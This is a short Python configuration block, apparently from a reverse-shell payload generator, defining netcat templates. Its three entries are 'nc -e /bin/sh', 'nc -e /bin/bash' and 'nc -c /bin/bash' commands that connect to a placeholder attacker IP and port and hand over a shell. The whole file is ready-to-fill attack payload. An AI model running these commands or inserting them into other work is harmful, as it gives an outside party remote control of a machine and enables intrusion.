conf = {
    "name": "nc",
    "templates": [
        "nc -e /bin/sh %IP% %PORT%",
        "nc -e /bin/bash %IP% %PORT%",
        "nc -c /bin/bash %IP% %PORT%",
    ]
}